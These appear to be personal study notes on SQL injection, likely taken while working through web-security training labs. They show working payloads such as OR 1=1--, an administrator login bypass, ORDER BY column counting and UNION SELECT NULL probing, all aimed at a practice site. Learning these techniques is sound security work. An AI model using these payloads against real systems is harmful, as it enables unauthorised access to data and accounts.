An vulnerability that makes an attacker to modify a sql query which the application provides to database.

The common places in queries for sql injection:
INSERT query - Value attribute

UPDATE query - WHERE values

SELECT query - table name or col name

SELECT query -ORDER BY clause

### Sample Injection :  OR 1=1--

```perl
https://insecure-website.com/products?category=Gifts'+OR+1=1--

-> causes

SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND condition

In burp we need to put 
category = 'Gifts'+OR+1=1+--
-> + acts as separator of values primarily and as white space secondarily.
```

Provides data from all categories,  and don’t consider the condition

### Can avoid password with this query :

```perl
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

Query : (In burp)

username=administrator'+--
```

### SQL Injection : Union Attacks

Sometimes results of sql query are returned with application’s ui responses, here we can get data from other table in same database using UNION keyword of sql query.

```perl
SELECT a, b FROM table1 UNION SELECT c, d FROM table2

-> The number of columns on both table should be same and the datatypes of columns 
	 should be same.
```

We can find the number of columns of the db which parses the sql query by using “Order BY” clause.

```perl
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```

When the web’s response differs from normal output/response, we can understand it is the limit of columns in the table. But here we will get http response, which may become blank/no output at some time due to db’s result. For this we use the alternative “ ‘ UNION SELECT NULL, NULL —

The thing is null will match with any data types of the column, and in maximum cases the response won’t be blank but will just add one extra row of null values with tables values to output.

```perl
'+UNION+SELECT+NULL,+NULL+--

-> in queries and remove all default values of the parameters, correct number of nulls 
will give 200 status code.

```
